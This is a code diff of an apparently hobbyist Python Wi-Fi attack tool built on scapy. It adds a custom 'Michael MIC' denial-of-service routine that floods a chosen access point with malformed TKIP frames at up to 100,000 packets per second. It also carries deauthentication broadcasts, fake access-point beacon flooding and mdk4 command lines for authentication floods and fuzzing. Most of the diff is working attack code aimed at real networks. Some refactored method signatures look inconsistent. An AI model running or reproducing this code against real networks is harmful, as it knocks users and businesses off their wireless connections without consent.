@@ -7,6 +7,8 @@ import threading
 import subprocess
 from scapy.all import *
 from scapy.all import Dot11, Dot11Beacon, Dot11Elt, sniff
+from scapy.all import RadioTap, Dot11, Dot11Beacon, Dot11Elt, Dot11Auth, Dot11ProbeReq, Dot11QoS, Raw, sendp
+
 from scapy.layers.dot11 import *
 _this_dir = os.path.dirname(os.path.abspath(__file__))
 _parent_dir = os.path.dirname(_this_dir)
@@ -17,14 +19,11 @@ for _p in [_parent_dir, _this_dir]:
 import banner
 from debugs import debug
 
-class WiFiAttackModule:
+# i mean it seems more fun making my own attacks than rely on mdk4
+# so why not do it :D if it works it works
+class AttackModule:
     def __init__(self):
-        self.networks = {}
-        self.stop_sniff = False
-        self.scan_threads = []
-        self.monitor_mode_enabled = False
-        self.original_interface = None
-        self.interface = None
+        pass
     def deauth_all(self, access_point, interface):
         packet = RadioTap() / Dot11(addr1="FF:FF:FF:FF:FF:FF", 
                         addr2=access_point,
@@ -43,9 +42,8 @@ class WiFiAttackModule:
                 break
     
     def access_point_flood(self, interface, count=200):
-        """Continuously broadcast fake access points with noisy garbage SSIDs."""
         noise_chars = string.punctuation
-        supported_rates = b'\x82\x84\x8b\x96'  # 1,2,5.5,11 Mbps
+        supported_rates = b'\x82\x84\x8b\x96'
         debug("info", f"Starting AP flood on {interface} with APs...")
         debug("info", "AP Flood Running... Press Ctrl+C to stop.")
         self.stop_sniff = False
@@ -83,9 +81,75 @@ class WiFiAttackModule:
                 break
 
             time.sleep(0.0005)
-
         debug("info", "AP flood stopped.")
-    
+
+    def michael_mic_dos(interface, target_bssid, channel, total_packets=0, pps=100000):
+        debug("info", f"[*] Michael MIC Attack")
+        debug("info", f"[*] Target: {target_bssid} | Channel: {channel}")
+        debug("info", f"[*] Total packets: {'infinite' if total_packets <= 0 else total_packets} | Speed: {pps} pps")
+
+        # Set channel
+        os.system(f"iw dev {interface} set channel {channel}")
+        time.sleep(0.5)
+        
+        # Calculate delay between packets
+        inter = 1.0 / pps if pps > 0 else 0.00001
+        
+        # Fake client MAC
+        client_mac = "02:00:00:00:00:01"
+        
+        # Build malformed QoS frame with invalid TKIP MIC
+        packet = RadioTap() / Dot11(
+            type=2,           # Data frame
+            subtype=8,        # QoS Data
+            FCfield=0x41,
+            addr1=target_bssid,
+            addr2=client_mac,
+            addr3=target_bssid
+        ) / Dot11QoS(TID=0) / Raw(
+            b"\x00\x00\x00\x20"
+            + b"\x00\x00\x00\x00"
+            + b"\xff" * 20
+            + b"\xaa\xbb\xcc\xdd"
+        )
+        
+        debug("info", "[*] Sending malformed TKIP frames...")
+        
+        sent = 0
+        start_time = time.time()
+        
+        try:
+            while True:
+                if total_packets > 0 and sent >= total_packets:
+                    break
+                chunk_size = 100 if total_packets <= 0 else min(100, total_packets - sent)
+                for _ in range(chunk_size):
+                    sendp(packet, iface=interface, count=1, inter=inter, verbose=0)
+                    sent += 1
+                
+                # Progress update
+                if sent % 100000 == 0:
+                    elapsed = time.time() - start_time
+                    total_text = 'infinite' if total_packets <= 0 else total_packets
+                    rate = sent / elapsed if elapsed > 0 else 0
+                    print(f"[*] Sent: {sent}/{total_text} ({rate:.0f} pps)")
+            
+            if total_packets > 0:
+                elapsed = time.time() - start_time
+                print(f"[+] Attack complete! Sent {sent} packets in {elapsed:.1f}s")
+            
+        except KeyboardInterrupt:
+            debug("info", f"Attack Ended by user. Total packets sent: {sent}")
+
+
+class ModuleSetup:
+    def __init__(self):
+        self.networks = {}
+        self.stop_sniff = False
+        self.scan_threads = []
+        self.monitor_mode_enabled = False
+        self.original_interface = None
+        self.interface = None
 
     def cleanup_monitor_mode(self):
         if not self.monitor_mode_enabled:
@@ -299,13 +363,14 @@ class WiFiAttackModule:
             elif atkmode == "1" or atkmode.lower() == "authentication denial of service":
                 os.system(f"mdk4 {self.interface} a -m -s 10000 -a {chosen_bssid}")
             elif atkmode == "2" or atkmode.lower() == "michael countermeasures dos":
-                os.system(f"mdk4 {self.interface} m -w 0 -n 850000 -s 100000 -t {chosen_bssid}")
+                AttackModule.michael_mic_dos(self.interface, chosen_bssid, channel)
+                #os.system(f"mdk4 {self.interface} m -w 0 -n 850000 -s 100000 -t {chosen_bssid}")
             elif atkmode == "3" or atkmode.lower() == "packet fuzzer attack":
                 channel = input("Channel to attack, 'h' for hop: ")
                 debug("info", "Starting...")
                 os.system(f"mdk4 {self.interface} f -s abcp -m n -p 24500 -c {channel}")
             elif atkmode == "4" or atkmode.lower() == "deauth denial of service":
-                self.deauth_all(chosen_bssid, self.interface)
+                AttackModule.deauth_all(self, chosen_bssid, self.interface)
     def run(self):
         try:
             signal.signal(signal.SIGINT, self.signal_handler)
@@ -334,7 +399,7 @@ class WiFiAttackModule:
                 if others == "0":
                     return
                 elif others == "1" or others.lower() == "network flood":
-                    self.access_point_flood(self.interface)
+                    AttackModule.access_point_flood(self, self.interface)
                 return
 
             # Normal mode with scan, youll enjoy these cause yes
